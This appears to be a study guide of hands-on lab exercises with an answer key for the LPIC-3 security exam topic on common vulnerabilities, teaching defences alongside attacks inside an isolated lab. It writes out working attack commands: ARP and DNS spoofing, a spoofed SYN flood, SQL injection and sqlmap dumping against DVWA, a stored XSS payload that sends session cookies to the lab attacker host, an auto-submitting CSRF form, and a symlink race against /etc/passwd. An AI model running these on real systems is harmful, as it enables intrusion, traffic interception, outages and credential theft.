# 335.1 Common Security Vulnerabilities and Threats — Guided Exercises

> **Exam:** LPIC-3 Security 303-300 (v3.0.0) · **Topic 335.1** · Exam weight: 3
> **Objective source:** <https://www.lpi.org/our-certifications/exam-303-objectives/>

These exercises walk you through the threat classes named in the 335.1 objective — reconnaissance, impersonation, denial of service, programming errors, cryptographic weaknesses — plus botnets, CVE and CVSS. Each block is a sequence of numbered steps you run, followed by comprehension questions. Model answers are in the collapsible section at the end.

---

## ⚠️ Lab authorization notice (read before step 1)

Every offensive technique below is destructive or unlawful when aimed at systems you do not own or lack written authorization to test. Scanning, spoofing and flooding a network you do not control is a crime in most jurisdictions (e.g. the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, Argentina's Ley 26.388). Perform all steps inside an **isolated lab you own**: a host-only or internal virtual network with no route to production or the Internet, or throwaway containers on a single machine.

Recommended lab topology used throughout:

```
                 host-only network 10.0.0.0/24 (no gateway to the outside)
   ┌───────────────┬───────────────────────────┬────────────────────────┐
   │ attacker      │ victim / target           │ observer (optional)     │
   │ 10.0.0.10     │ 10.0.0.20                  │ 10.0.0.30               │
   │ Kali/Debian   │ Debian + services + DVWA  │ Debian + tcpdump/Wireshark
   └───────────────┴───────────────────────────┴────────────────────────┘
```

Install the tooling once on the attacker node:

```bash
sudo apt-get update
sudo apt-get install -y nmap hping3 dsniff ettercap-text-only tcpdump \
                        dnsutils gdb build-essential docker.io python3-pip
```

---

## Exercise 1 — Reconnaissance: active scanning and service fingerprinting

**Goal:** Understand how an attacker maps a target before an attack, and what each scan type reveals at the packet level.

1. From the attacker (`10.0.0.10`), run a fast host-discovery sweep of the lab subnet (ARP-based on a local link, so no TCP is sent yet):

   ```bash
   sudo nmap -sn 10.0.0.0/24
   ```

   Expected (abridged):

   ```
   Nmap scan report for 10.0.0.20
   Host is up (0.00042s latency).
   MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox virtual NIC)
   Nmap done: 256 IP addresses (2 hosts up) scanned in 2.05s
   ```

2. Run a **TCP SYN (half-open) scan** of the target's top 1000 ports while capturing traffic on the observer node. On the observer first:

   ```bash
   sudo tcpdump -ni eth0 host 10.0.0.20 and 'tcp[tcpflags] & (tcp-syn|tcp-rst) != 0'
   ```

   Then, on the attacker:

   ```bash
   sudo nmap -sS -Pn 10.0.0.20
   ```

3. Run a **service/version and OS detection** scan and save it in all formats:

   ```bash
   sudo nmap -sV -O -oA recon-10.0.0.20 10.0.0.20
   ```

   Expected (abridged):

   ```
   PORT    STATE SERVICE VERSION
   22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
   80/tcp  open  http    Apache httpd 2.4.57 ((Debian))
   3306/tcp open mysql   MySQL 8.0.36
   ```

4. Compare against a **TCP connect scan** (`-sT`) and a **UDP scan** of a few ports:

   ```bash
   sudo nmap -sT -p22,80 10.0.0.20
   sudo nmap -sU -p53,123,161 10.0.0.20
   ```

**Comprehension questions**

- **Q1.** In the SYN scan, how does Nmap decide a port is `open`, `closed` or `filtered`, and why is it called "half-open"?
- **Q2.** What is the operational difference between `-sS` and `-sT`, and why does `-sT` show up more readily in application logs on the target?
- **Q3.** UDP scanning is far slower and noisier per port. Explain why `open|filtered` is such a common result for UDP ports.
- **Q4.** Reconnaissance also includes *social engineering*. Name two social-engineering techniques and state why they bypass every technical control on the target host.

---

## Exercise 2 — Impersonation: ARP spoofing and a man-in-the-middle

**Goal:** See how a Layer-2 attack redirects traffic through the attacker, and identify the defence.

1. On the **victim** (`10.0.0.20`), record the current ARP mapping for the observer/gateway you will impersonate:

   ```bash
   ip neigh show
   # 10.0.0.30 dev eth0 lladdr 08:00:27:11:22:33 REACHABLE
   ```

2. On the **attacker**, enable IPv4 forwarding so intercepted traffic is still delivered (otherwise you cause a DoS, not a MITM):

   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```

3. Poison both directions so the attacker sits between the victim and the observer:

   ```bash
   sudo arpspoof -i eth0 -t 10.0.0.20 10.0.0.30 &
   sudo arpspoof -i eth0 -t 10.0.0.30 10.0.0.20 &
   ```

4. On the victim, re-check the ARP table — the target's MAC now points to the attacker:

   ```bash
   ip neigh show
   # 10.0.0.30 dev eth0 lladdr 08:00:27:AB:CD:EF REACHABLE   <-- attacker's MAC
   ```

5. On the attacker, capture the redirected traffic and observe cleartext credentials if the victim uses an unencrypted protocol (e.g. HTTP or FTP to a lab service):

   ```bash
   sudo tcpdump -ni eth0 -A 'host 10.0.0.20 and port 80'
   ```

6. Stop the attack and let the caches heal:

   ```bash
   sudo kill %1 %2
   ```

**Comprehension questions**

- **Q5.** ARP has no authentication. Explain the exact protocol behaviour that makes a *gratuitous ARP reply* poison a victim's cache even though the victim never asked.
- **Q6.** Why is `net.ipv4.ip_forward=1` the difference between a MITM and an accidental denial of service?
- **Q7.** The victim was using HTTPS to a different site and you saw only ciphertext. What must an attacker add to a MITM to downgrade or intercept TLS, and which browser/HSTS mechanism defeats it?
- **Q8.** Name one switch-level and one host-level mitigation against ARP spoofing.

---

## Exercise 3 — Impersonation: DNS spoofing / cache poisoning

**Goal:** Redirect a name lookup to an attacker-controlled address on top of the MITM position from Exercise 2.

1. On the attacker, create an ettercap DNS spoofing table that maps a lab domain to your address:

   ```bash
   echo 'intranet.lab   A   10.0.0.10' | sudo tee /etc/ettercap/etter.dns
   ```

2. Launch ettercap in text mode with the DNS plugin, targeting the victim and the lab resolver:

   ```bash
   sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.0.20// /10.0.0.30//
   ```

3. On the victim, resolve the name and confirm it now returns the attacker:

   ```bash
   dig +short intranet.lab @10.0.0.30
   # 10.0.0.10
   ```

4. Contrast with a **remote cache-poisoning** thought experiment: on any resolver, inspect whether DNSSEC validation is enabled (the real defence):

   ```bash
   dig +dnssec +multiline example.com. SOA
   # look for the 'ad' flag in the header and RRSIG records
   ```

**Comprehension questions**

- **Q9.** In the LAN attack you forged the *answer* because you were on-path. Kaminsky-style remote poisoning does not need on-path access — what two fields must the off-path attacker guess before the legitimate reply arrives, and what made the 2008 attack practical?
- **Q10.** How does source-port randomization *and* DNSSEC each raise the bar, and which one provides cryptographic (not just probabilistic) protection?

---

## Exercise 4 — Denial of Service: SYN flood and SYN cookies

**Goal:** Exhaust a target's half-open connection table, then defend with SYN cookies.

1. On the **victim**, temporarily **disable** SYN cookies and shrink the backlog so the effect is visible quickly (lab only — revert afterward):

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=0
   sudo sysctl -w net.ipv4.tcp_max_syn_backlog=128
   ```

2. Start a listening service and a monitor on the victim:

   ```bash
   sudo ss -ntl 'sport = :80'      # baseline
   watch -n1 "ss -n state syn-recv | wc -l"
   ```

3. From the attacker, launch a SYN flood with spoofed random source addresses:

   ```bash
   sudo hping3 -S --flood --rand-source -p 80 10.0.0.20
   ```

4. On the victim, watch the `SYN-RECV` count climb toward the backlog limit and observe legitimate clients timing out:

   ```bash
   # attacker's legitimate second terminal:
   curl --max-time 3 http://10.0.0.20/    # now hangs / times out
   ```

5. Stop the flood (`Ctrl-C`), then **enable SYN cookies** and repeat step 3:

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=1
   ```

   Observe in `dmesg`:

   ```
   TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
   ```

6. Restore sane defaults:

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=1
   sudo sysctl -w net.ipv4.tcp_max_syn_backlog=1024
   ```

**Comprehension questions**

- **Q11.** Describe the three-way handshake and pinpoint exactly which state the half-open entries are stuck in during the flood.
- **Q12.** How do SYN cookies let the server accept a connection *without* storing state for the half-open entry? What information is encoded into the initial sequence number?
- **Q13.** What is the practical cost/limitation of SYN cookies (hint: think about TCP options like window scaling and SACK)?
- **Q14.** SYN flood is *volumetric-ish but really state-exhaustion*. Contrast it with an **amplification/reflection** attack (e.g. DNS or NTP `monlist`): what makes reflection produce far more attack traffic than the attacker sends, and why does it also hide the attacker?

---

## Exercise 5 — Programming errors: SQL injection

**Goal:** Exploit and then understand unparameterized queries using the deliberately vulnerable DVWA.

1. On the **victim**, run DVWA in a container and set security to "low" via the web UI (`http://10.0.0.20/`):

   ```bash
   sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa
   ```

2. In the "SQL Injection" module, submit a normal ID (`1`) and observe the query returns one user. Then submit a classic tautology in the `id` field:

   ```
   1' OR '1'='1
   ```

   All rows are returned.

3. Enumerate the column count with `ORDER BY`, then extract data with a `UNION`:

   ```
   1' ORDER BY 2 -- -
   1' UNION SELECT user, password FROM users -- -
   ```

   The `users` table's hashed passwords are dumped into the page.

4. Automate the same finding to see how a scanner confirms it (still against your lab only):

   ```bash
   sqlmap -u "http://10.0.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=<yours>; security=low" --batch --dbs
   ```

5. Switch DVWA to "high" security and inspect the source diff (the app now uses a **prepared statement** / parameterized query). Re-try the tautology — it fails.

**Comprehension questions**

- **Q15.** Explain precisely why `1' OR '1'='1` changes the meaning of the SQL statement. Show what the concatenated query becomes.
- **Q16.** Why does a *parameterized/prepared statement* stop this class of attack at the root, and why is input escaping/blacklisting an inferior defence?
- **Q17.** The `UNION SELECT` needed the right column count. Why, and how does an attacker discover it blind (no error messages)?
- **Q18.** What is the principle of *least privilege* for the database account here, and how would it have limited the blast radius even with the bug present?

---

## Exercise 6 — Programming errors: Cross-Site Scripting (XSS) and CSRF

**Goal:** Distinguish reflected vs stored XSS, and see why CSRF is a different bug even though both live in the browser.

1. In DVWA (low), open "XSS (Reflected)". Submit in the name field:

   ```html
   <script>alert(document.cookie)</script>
   ```

   The script executes in your session — the payload was reflected unescaped into the response.

2. Open "XSS (Stored)", post a guestbook message containing:

   ```html
   <script>new Image().src='http://10.0.0.10/steal?c='+document.cookie</script>
   ```

   On the attacker, run a listener and watch the victim's cookie arrive when *anyone* views the page:

   ```bash
   python3 -m http.server 80
   # 10.0.0.20 - - "GET /steal?c=PHPSESSID=... HTTP/1.1" 404
   ```

3. Open "CSRF" (change-password module). Host a malicious auto-submitting form on the attacker and browse to it while logged into DVWA:

   ```html
   <body onload="document.forms[0].submit()">
     <form action="http://10.0.0.20/vulnerabilities/csrf/"
           method="GET">
       <input type="hidden" name="password_new" value="pwned">
       <input type="hidden" name="password_conf" value="pwned">
       <input type="hidden" name="Change" value="Change">
     </form>
   </body>
   ```

4. Confirm the password changed *without* the victim's intent, then switch DVWA to "high" and observe the anti-CSRF **token** (`user_token`) now required.

**Comprehension questions**

- **Q19.** Reflected vs stored XSS: where does the payload live in each, and why is stored XSS generally more severe?
- **Q20.** State the two output-side defences (context-aware output encoding and Content-Security-Policy) and the one cookie flag (`HttpOnly`) that would each have blunted step 2.
- **Q21.** CSRF and XSS both run in the victim's browser. Explain the core difference: what does CSRF abuse that XSS does not need? Why does a per-request anti-CSRF token defeat it but `HttpOnly` does not?
- **Q22.** How does the `SameSite` cookie attribute relate to CSRF, and what does `SameSite=Lax` vs `Strict` change?

---

## Exercise 7 — Programming errors: buffer overflow and race conditions

**Goal:** Observe memory-safety and time-of-check/time-of-use bugs, and the mitigations that neutralize them.

**Part A — Stack buffer overflow (concept demonstration)**

1. Write a deliberately vulnerable program and compile it with modern protections **off** so the mechanism is visible:

   ```c
   /* vuln.c */
   #include <stdio.h>
   #include <string.h>
   void win(void){ puts("control flow hijacked"); }
   void greet(char *s){ char buf[64]; strcpy(buf, s); printf("hi %s\n", buf); }
   int main(int argc, char **argv){ greet(argv[1]); return 0; }
   ```

   ```bash
   gcc -g -O0 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
   ```

2. Trigger a crash by overflowing the 64-byte buffer, and inspect the corrupted saved return address in gdb:

   ```bash
   ./vuln $(python3 -c 'print("A"*80)')        # Segmentation fault
   gdb -q --args ./vuln $(python3 -c 'print("A"*80)')
   (gdb) run
   (gdb) info registers rip      # shows 0x4141414141410000-ish
   ```

3. Now recompile with defences **on** (the distro defaults) and repeat:

   ```bash
   gcc -g -O0 -fstack-protector-strong -fPIE -pie vuln.c -o vuln_safe
   ./vuln_safe $(python3 -c 'print("A"*80)')
   # *** stack smashing detected ***: terminated  → Aborted
   ```

**Part B — TOCTOU race condition**

4. Reproduce a time-of-check/time-of-use race with a symlink swap against a naive "check then write" pattern:

   ```bash
   # naive victim script (runs as a privileged user):
   f=/tmp/report.$$; [ -e "$f" ] || echo "data" > "$f"

   # attacker loop, racing to plant a symlink between the check and the write:
   while :; do ln -sf /etc/passwd /tmp/report.12345 2>/dev/null; done
   ```

**Comprehension questions**

- **Q23.** In Part A, what exactly did the 80 bytes overwrite to end up in `RIP`, and why does that give an attacker control of execution?
- **Q24.** Name the three mitigations you toggled or that the OS provides — stack canary (`-fstack-protector`), ASLR/PIE, and NX/DEP (`execstack`) — and say what each one specifically prevents.
- **Q25.** In Part B, what are the "check" and the "use", and why does the gap between them create the vulnerability? Give the correct fix (atomic operation) that eliminates the window.

---

## Exercise 8 — Cryptographic weaknesses

**Goal:** Recognize weak primitives and protocol misuse without needing to break real crypto.

1. Demonstrate why unsalted, fast hashes are weak. Hash a common password with MD5 and observe collision-prone, dictionary-vulnerable output:

   ```bash
   echo -n "password" | md5sum
   # 5f4dcc3b5aa765d61d8327deb882cf99   (instantly reversible via any rainbow table)
   ```

2. Inspect a server's TLS for deprecated protocol versions and cipher suites (against your lab HTTPS service):

   ```bash
   nmap --script ssl-enum-ciphers -p 443 10.0.0.20
   # flags: TLSv1.0 / SSLv3 offered, RC4, 3DES, or NULL/EXPORT ciphers  → weak (grade F)
   ```

3. Show why ECB mode leaks structure — encrypt a bitmap with `aes-128-ecb` and view it: identical plaintext blocks produce identical ciphertext blocks (the classic "ECB penguin").

   ```bash
   openssl enc -aes-128-ecb -in tux.bmp -out tux.ecb -K 00112233445566778899aabbccddeeff -nosalt
   ```

**Comprehension questions**

- **Q26.** Why are MD5 and SHA-1 unsuitable both as password hashes *and* for digital signatures — and are the two reasons the same? (Distinguish speed/salting from collision resistance.)
- **Q27.** Explain the "ECB penguin": why does ECB reveal plaintext patterns, and what property do CBC/GCM add to prevent it?
- **Q28.** Name two named TLS-era attacks (e.g. POODLE, BEAST, Heartbleed, ROBOT) and, for one, whether it was a *protocol/mode* flaw or an *implementation* flaw.

---

## Exercise 9 — CVE and CVSS

**Goal:** Use the industry vocabulary for tracking and prioritizing vulnerabilities.

1. Look up a well-known CVE and read its authoritative record (source: MITRE `cve.org` and NVD):

   ```bash
   # Log4Shell
   curl -s https://cveawg.mitre.org/api/cve/CVE-2021-44228 | jq '.containers.cna.descriptions[0].value'
   ```

   Then open the NVD entry: <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>

2. Read the **CVSS v3.1 vector** on that NVD page:

   ```
   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H   → Base score 10.0 (Critical)
   ```

3. Decode the vector by hand, then verify with the official FIRST calculator: <https://www.first.org/cvss/calculator/3.1>

4. Scan your lab host for known CVEs with an offline-capable scanner:

   ```bash
   # Container/image example:
   trivy image vulnerables/web-dvwa
   # or OS package audit on Debian:
   sudo apt-get install -y debsecan && debsecan --suite bookworm
   ```

**Comprehension questions**

- **Q29.** What is a CVE identifier, who assigns it (the CNA model), and what does a CVE record deliberately *not* include?
- **Q30.** Decode `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`: what does each metric mean and why does `S:C` (scope changed) push the score to the maximum?
- **Q31.** Distinguish the CVSS **Base**, **Temporal/Threat**, and **Environmental** metric groups. Why is a Base score alone a poor way to prioritize patching in your own environment?
- **Q32.** How do EPSS and CISA KEV complement CVSS for real-world prioritization?

---

## Exercise 10 — Botnets and command-and-control

**Goal:** Understand how compromised hosts are marshalled and how their C2 traffic is detected (detection only — no malware).

1. Model the lifecycle: infection → C2 rendezvous → tasking → action (DDoS, spam, crypto-mining). Simulate a *benign* beacon from the victim to visualize the pattern — a regular, low-jitter callback:

   ```bash
   # benign stand-in for a beacon (victim → attacker every 30s):
   while :; do curl -s -m2 http://10.0.0.10/checkin >/dev/null; sleep 30; done
   ```

2. On the observer, detect the periodicity that betrays automated beaconing rather than human browsing:

   ```bash
   sudo tcpdump -ni eth0 'host 10.0.0.10 and tcp[tcpflags] & tcp-syn != 0' -tttt
   # note the near-constant inter-arrival time between connections
   ```

3. Discuss detection signals: regular timing, DGA-generated domains, connections to newly registered domains, and volume of outbound DNS. Inspect DNS query volume:

   ```bash
   sudo tcpdump -ni eth0 udp port 53 | awk '{print $NF}' | sort | uniq -c | sort -rn | head
   ```

**Comprehension questions**

- **Q33.** Contrast a *centralized* (IRC/HTTP single-C2) botnet with a *peer-to-peer* botnet: what does P2P gain in resilience and what does the defender lose?
- **Q34.** What is a Domain Generation Algorithm (DGA), and why does it defeat static IP/domain blocklists? What detection approach still works against it?
- **Q35.** Give two network-level and one host-level indicator that a machine in your fleet has joined a botnet.

---

<details>
<summary><strong>Answer key (click to expand)</strong></summary>

**Q1.** Nmap sends a lone `SYN`. A `SYN/ACK` back ⇒ **open** (Nmap then sends `RST` to tear down before completing the handshake — hence *half-open*). A `RST` back ⇒ **closed**. No response after retransmits, or an ICMP unreachable (type 3, code 1/2/3/9/10/13) ⇒ **filtered** (a firewall dropped it). It never completes the third `ACK`, so no full connection is established.

**Q2.** `-sS` crafts raw packets and never finishes the handshake, so the kernel/application on the target never sees a completed socket → typically no application log entry (needs root/`CAP_NET_RAW`). `-sT` calls the OS `connect()`, completing the full three-way handshake, so the target's application `accept()`s and logs a connection (and it works without raw-socket privileges). `-sT` is therefore noisier and appears in web/SSH logs.

**Q3.** UDP is connectionless: an open port usually returns *nothing* (the application may or may not answer), and a closed port returns an ICMP port-unreachable — but hosts **rate-limit** ICMP, so absence of a reply is ambiguous between "open" and "dropped by filter". Nmap reports `open|filtered` when it gets no data and no ICMP error. Slowness comes from waiting out timeouts and ICMP rate limits per port.

**Q4.** Examples: **phishing/spear-phishing** (deceptive email/message harvesting credentials), **pretexting** (inventing a scenario to extract info), **baiting** (dropped USB), **tailgating** (physical piggybacking). They target the *human*, who has legitimate credentials and access, so no firewall, patch level or IDS on the host is involved — the attacker is handed valid access rather than breaking a technical control.

**Q5.** ARP is stateless and unauthenticated. A host accepts and caches any ARP reply (or gratuitous ARP announcement) it sees on the wire, overwriting the existing IP→MAC entry, without having sent a corresponding request. The attacker broadcasts "10.0.0.30 is at *my* MAC"; the victim blindly updates its cache and starts sending the observer's traffic to the attacker.

**Q6.** With forwarding **off**, packets destined for the real host arrive at the attacker and are dropped → the victim loses connectivity (a denial of service, and the attack is obvious). With `ip_forward=1`, the attacker relays packets to the true destination after inspecting/altering them, so communication continues normally and the interception is transparent — the definition of a MITM.

**Q7.** The attacker must terminate TLS themselves — present a certificate the victim trusts (via a rogue/installed CA, `sslsplit`/`mitmproxy`, or an SSL-stripping downgrade to HTTP). Defeated by **HSTS** (the browser refuses plain HTTP and refuses to click through cert warnings for that domain), certificate pinning, and HSTS preloading, which prevent both stripping and rogue-cert acceptance.

**Q8.** Switch level: **Dynamic ARP Inspection (DAI)** backed by DHCP snooping, or static/sticky port-MAC bindings. Host level: **static ARP entries** for critical peers (gateway), or an ARP-watch daemon (`arpwatch`) that alerts on MAC changes. (802.1X/port security also limits who can be on the segment.)

**Q9.** The off-path attacker must guess the **16-bit DNS transaction ID** *and* the **UDP source port** of the resolver's query, and win the race against the real authoritative reply. Kaminsky (2008) made it practical by forcing many queries for non-existent subdomains (so the cache miss keeps recurring) and poisoning the *NS/glue* records for the whole zone rather than one record — removing the "wait for TTL to expire" limitation and giving many parallel guessing attempts.

**Q10.** **Source-port randomization** adds ~16 bits of entropy on top of the transaction ID, turning a feasible guess into ~2³² attempts — a *probabilistic* defence that only raises cost. **DNSSEC** signs records with a chain of trust (RRSIG/DNSKEY/DS); a validating resolver rejects any forged answer because it fails signature verification — *cryptographic*, not probabilistic, protection (integrity/authenticity, though not confidentiality).

**Q11.** (1) Client → `SYN`; (2) server allocates a half-open entry and replies `SYN/ACK`; (3) client → `ACK`, connection becomes ESTABLISHED. During the flood the spoofed source never sends the third `ACK`, so entries pile up in the **`SYN-RECV`** state until the `tcp_max_syn_backlog` queue fills and new legitimate `SYN`s are dropped.

**Q12.** With SYN cookies the server sends `SYN/ACK` **without storing any state**: it encodes the connection parameters into the initial sequence number (ISN) — a cryptographic hash of the 4-tuple, a slowly changing timestamp/counter, and the MSS. When the client's `ACK` returns, `ack-1` carries that ISN back; the server recomputes the hash, validates it, and reconstructs the connection state on the fly. No `SYN-RECV` table entry is needed, so the backlog can't be exhausted.

**Q13.** The ISN has limited bits, so only a coarse MSS can be encoded and other TCP options negotiated in the original `SYN` (window scaling, SACK, timestamps) are normally **lost/limited** when cookies engage — hurting performance on high-latency or high-bandwidth links. Cookies are therefore a fallback that kicks in only under attack, not a permanent replacement for the backlog.

**Q14.** In a **reflection/amplification** attack the attacker sends small spoofed requests (with the *victim's* source IP) to many misconfigured servers; each server sends a much larger reply to the victim (DNS ANY ~50×, NTP `monlist` ~500×, memcached thousands×). The **amplification factor** multiplies bandwidth, and the source spoofing means the victim sees traffic from thousands of legitimate reflectors, hiding the real attacker. SYN flood, by contrast, targets *state* (the backlog), not raw bandwidth.

**Q15.** The app builds `SELECT ... WHERE id = '$id'`. Injecting `1' OR '1'='1` yields `... WHERE id = '1' OR '1'='1'`. The trailing `'` closes the intended literal, `OR '1'='1'` is always true, so the `WHERE` matches every row — the attacker changed the query's *logic*, not just its data.

**Q16.** A prepared statement sends the SQL structure to the database *first* and binds user input as **data parameters**, so input can never be parsed as SQL syntax — the injection point is closed at the parser level. Escaping/blacklisting is inferior because it's a denylist chasing every encoding, quoting style and DBMS quirk; one missed case (or a numeric context with no quotes) reopens the hole.

**Q17.** A `UNION SELECT` must have the **same number of columns** as the original query or it errors. Blind, the attacker uses `ORDER BY n` (increasing `n` until it errors, revealing the column count) or `UNION SELECT NULL,NULL,...` (adding NULLs until it succeeds), then places extractable data in the columns that get rendered.

**Q18.** The DB account the app uses should have only the privileges it needs (e.g. `SELECT/INSERT/UPDATE` on its own schema, **not** `DROP`, `FILE`, access to `mysql.user`, or other databases). With least privilege, even a working injection couldn't read other schemas, write files (`INTO OUTFILE`), or drop tables — limiting the blast radius.

**Q19.** Reflected XSS: the payload is in the **request** (URL/form) and echoed back in the immediate response — it must be delivered per-victim (e.g. a crafted link). Stored XSS: the payload is **persisted server-side** (DB, comment, profile) and served to *every* viewer automatically — more severe because it self-propagates to all users, including admins, without a lure.

**Q20.** **Context-aware output encoding** (HTML-encode `<>&"'` so the payload renders as text, not markup). **Content-Security-Policy** (disallow inline scripts / restrict script sources, so an injected `<script>` won't execute). **`HttpOnly`** on the session cookie so `document.cookie` can't read it, defeating the cookie-theft in step 2.

**Q21.** XSS runs *attacker-supplied script* in the victim's origin. CSRF injects **no script**; it abuses the browser's automatic attachment of the victim's **ambient credentials** (session cookie) to a forged cross-site request, so the server can't tell it wasn't user-initiated. A per-request **anti-CSRF token** defeats it because the attacker's off-origin page can't read the unpredictable token to include it. `HttpOnly` does *not* help — the browser still *sends* the cookie automatically; `HttpOnly` only stops JavaScript from *reading* it.

**Q22.** `SameSite` tells the browser whether to attach the cookie on cross-site requests. `SameSite=Strict` withholds it on *all* cross-site navigations (strong CSRF defence, but breaks inbound links to logged-in pages); `SameSite=Lax` (the modern default) sends it on top-level GET navigations but not on cross-site POST/subresource requests — blocking most CSRF while preserving usability.

**Q23.** `strcpy` copied 80 bytes into a 64-byte `buf`, overflowing past the buffer, past the saved base pointer, into the **saved return address** on the stack. When `greet` executes `ret`, the CPU pops that overwritten value into `RIP` (`0x4141...`), so the attacker controls the next instruction address — redirecting execution (e.g. to `win()` or injected shellcode).

**Q24.** **Stack canary** (`-fstack-protector`): a random guard value placed before the saved return address and checked on function exit; a linear overflow corrupts it → "stack smashing detected", aborting before `ret`. **ASLR + PIE**: randomizes stack/heap/lib/executable base addresses, so the attacker can't reliably predict where to jump. **NX/DEP** (no `execstack`): marks the stack non-executable, so injected shellcode on the stack can't run (forcing ROP/ret2libc instead). Together they turn a trivial overflow into a hard, often defeated, exploit.

**Q25.** The **check** is `[ -e "$f" ]` (test whether the file exists); the **use** is `echo ... > "$f"` (write to it). Between check and use the attacker swaps `$f` for a symlink to `/etc/passwd`, so the privileged write lands on the attacker-chosen target — a TOCTOU race. Fix: make it **atomic** — e.g. `set -o noclobber` with `> "$f"` failing if it exists, or `open(O_CREAT|O_EXCL)` / `mktemp`, which create-and-check in one syscall with no exploitable window; avoid predictable names in world-writable dirs.

**Q26.** Two *different* reasons. As **password hashes**, MD5/SHA-1 fail because they're *fast* and (as used) unsalted, so attackers brute-force/rainbow-table them at billions/sec — the fix is slow, salted, memory-hard KDFs (bcrypt/scrypt/Argon2), independent of collision math. As **signature/certificate hashes**, they fail because they're no longer **collision-resistant** (MD5 broken since 2004/2008 rogue-CA; SHA-1 SHAttered 2017), letting an attacker craft two documents with the same digest so a signature transfers to a forgery.

**Q27.** ECB encrypts each block independently with the same key, so **identical plaintext blocks → identical ciphertext blocks**. Large uniform regions of an image thus keep their outline (the penguin is still visible). CBC (chaining each block with the previous ciphertext via an IV) and GCM (counter mode + authentication) add **semantic security via randomization/IV** so identical plaintext blocks encrypt differently; GCM additionally provides integrity/authentication.

**Q28.** Examples — **POODLE** (SSLv3 CBC padding oracle: protocol/mode flaw), **BEAST** (TLS 1.0 CBC IV predictability: protocol/mode), **Heartbleed** (OpenSSL heartbeat buffer over-read: *implementation* flaw), **ROBOT/DROWN** (RSA PKCS#1v1.5 padding oracle: protocol/crypto misuse). E.g. Heartbleed was an implementation bug in one library; POODLE was a flaw in the SSLv3 protocol/mode itself.

**Q29.** A **CVE** is a unique identifier (`CVE-YYYY-NNNNN`) for one publicly known vulnerability, providing a common reference across tools/vendors. It's assigned by a **CNA** (CVE Numbering Authority — MITRE as root, plus vendors/orgs) under the MITRE/CVE Program. A CVE record deliberately does **not** include a severity score, exploit code, or remediation depth — it's an identifier + description + references; scoring (CVSS) and analysis are added by NVD and others.

**Q30.** `AV:N` attack vector Network (exploitable remotely), `AC:L` attack complexity Low, `PR:N` no privileges required, `UI:N` no user interaction, `S:C` **scope Changed** (the exploited component can impact resources beyond its security scope), `C:H/I:H/A:H` High confidentiality, integrity and availability impact. `S:C` widens the impact accounting (impacts count against a different authority than the vulnerable component), which combined with all-remote/no-auth/full-impact yields the maximum **10.0**.

**Q31.** **Base** = intrinsic, constant severity (exploitability + impact). **Temporal/Threat** = time-varying factors (exploit maturity, remediation availability, report confidence). **Environmental** = *your* deployment (asset criticality via C/I/A requirements, modified base metrics for your controls). Base alone is a poor prioritizer because it ignores whether the asset is exposed/critical in *your* network and whether the flaw is actually being exploited — a Base 9.8 on an isolated dev box may matter less than a 6.5 on an Internet-facing crown-jewel.

**Q32.** **EPSS** (Exploit Prediction Scoring System, FIRST) estimates the *probability the CVE is exploited in the wild in the next 30 days* — a likelihood signal CVSS lacks. **CISA KEV** (Known Exploited Vulnerabilities) is a curated list of CVEs with *confirmed* active exploitation. Combining "severe" (CVSS) with "likely/known exploited" (EPSS/KEV) focuses limited patching effort on what will actually hurt you.

**Q33.** **Centralized** botnets (IRC/HTTP single or few C2 servers) are simple and low-latency to command but have a single point of failure — sinkhole/seize the C2 and the botnet dies. **P2P** botnets distribute tasking among peers with no central server, so takedown requires reaching many nodes; the defender loses the easy decapitation point and must enumerate/poison the overlay instead. P2P gains resilience/redundancy at the cost of command latency and complexity.

**Q34.** A **DGA** algorithmically generates a large, changing set of pseudo-random domain names (seeded by date/time) that the bot tries in turn to find the live C2; the operator only registers a few. Static IP/domain blocklists fail because the domains rotate constantly and are mostly never registered. Detection that still works: statistical/ML analysis of domain *characteristics* (high entropy, non-dictionary strings) and the flood of **NXDOMAIN** responses from bots probing unregistered names.

**Q35.** Network: (1) **periodic, low-jitter beaconing** to the same host/domain (machine-like timing); (2) large volumes of **outbound DNS/NXDOMAIN** or connections to newly-registered/low-reputation domains, or unexpected outbound SMTP/DDoS traffic. Host: unknown persistent processes/services, unexpected autostart entries, or unexplained high CPU (crypto-mining) — corroborated by EDR/AV or file-integrity alerts.

</details>

---

**Sources**

- LPI Exam 303-300 Objectives (v3.0.0): <https://www.lpi.org/our-certifications/exam-303-objectives/>
- Nmap Reference Guide — scan techniques: <https://nmap.org/book/man-port-scanning-techniques.html>
- Linux TCP SYN cookies (`tcp_syncookies`): <https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt>
- OWASP — SQL Injection, XSS, CSRF: <https://owasp.org/www-community/attacks/> · CSRF Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- CVE Program (MITRE): <https://www.cve.org/> · NVD: <https://nvd.nist.gov/>
- FIRST CVSS v3.1 specification & calculator: <https://www.first.org/cvss/v3-1/specification-document> · <https://www.first.org/cvss/calculator/3.1>
- FIRST EPSS: <https://www.first.org/epss/> · CISA KEV Catalog: <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>